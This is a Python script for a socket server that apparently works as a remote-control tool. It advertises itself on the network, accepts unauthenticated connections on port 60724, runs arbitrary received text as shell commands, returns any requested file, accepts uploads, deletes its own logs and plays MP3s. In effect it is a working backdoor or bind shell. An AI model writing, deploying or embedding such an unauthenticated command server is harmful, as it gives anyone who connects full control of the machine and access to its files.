#!/usr/bin/env python
# -*- coding:utf-8 -*-

from os import mkdir, remove, listdir
from os.path import exists, split
from socket import socket
from sys import argv
from threading import Thread
from time import strftime

from lib.sound import Mp3, execute, MCIError
from lib.network import broadcast, get_host_ip, send_file, recv_file, send_data
from lib.other import log_write, popen, release_port, cd

PATH = split(argv[0])[0]
LOG_FILENAME = "%s.log" % strftime("%m.%d")

if not exists("dl"):
    mkdir("dl")

if not exists(".log"):
    mkdir(".log")


def mp3play(cmd, args):
    if cmd == "play":
        try:
            music = Mp3(" ".join(args), "rbm")
        except MCIError as error:
            return error
        else:
            return music.play()
    else:
        command = [cmd]
        command.extend(args)
        try:
            execute(" ".join(command))
        except MCIError as error:
            return error


def log_func(args, conn: socket):
    if len(args) < 2:
        return "Missing param"
    if args[0] == "get":
        path = "%s/.log/%s" % (PATH, args[1])
        if not exists(path):
            return "No such file"
        if send_file(path, conn):
            return "Done"
        else:
            return "Get failure"
    elif args[0] == "rm":
        try:
            if len(args) > 2:
                for file in args[1:]:
                    remove("%s/.log/%s" % (PATH, file))
            elif args[1] != "-a":
                remove("%s/.log/%s" % (PATH, args[1]))
            else:
                for file in listdir("%s/.log" % PATH):
                    remove("%s/.log/%s" % (PATH, file))
        except Exception as error:
            return repr(error)
        else:
            return "Done"


def main():
    Thread(target=broadcast).start()

    while True:
        conn, addr = server.accept()
        log_write("%s connect" % addr[0], PATH)

        while True:
            cmd = conn.recv(1024).decode().split()

            log_write(" ".join(cmd), PATH)

            if cmd[0] == "exit":
                conn.close()
                break
            elif cmd[0] == "sendfile":
                if recv_file(conn, "%s/dl" % PATH):
                    result = "Successful"
                else:
                    result = "failure"
            elif cmd[0] == "getfile":
                if len(cmd) != 2:
                    send_data(conn, b"Missing param")
                elif not exists(cmd[1]):
                    send_data(conn, b"No such file")
                else:
                    send_data(conn, b"0")
                    send_file(cmd[1], conn)
                continue
            elif cmd[0] == "mp3":
                if len(cmd) < 2:
                    result = "Missing param"
                else:
                    if mp3play(cmd[1], cmd[2:]):
                        result = "Mp3 cmd executed failure"
                    else:
                        result = "Done"
            elif cmd[0] == "log":
                result = log_func(cmd[1:], conn)
            elif cmd[0] == "cd":
                result = cd(cmd[1:])
            else:
                result = popen(" ".join(cmd))[0]

                if not result:
                    result = " "
            data = result.encode()
            send_data(conn, data)


if __name__ == '__main__':
    release_port()
    server = socket()
    server.bind((get_host_ip(), 60724))
    server.listen(3)
    while True:

        try:
            main()
        except Exception as err:
            err_inf = err.__traceback__

            # 将异常写入日志
            log_write(
                "'%s'[%s] %s\n" % (
                    err_inf.tb_frame.f_globals["__file__"],
                    err_inf.tb_lineno,
                    repr(err)),
                PATH
            )
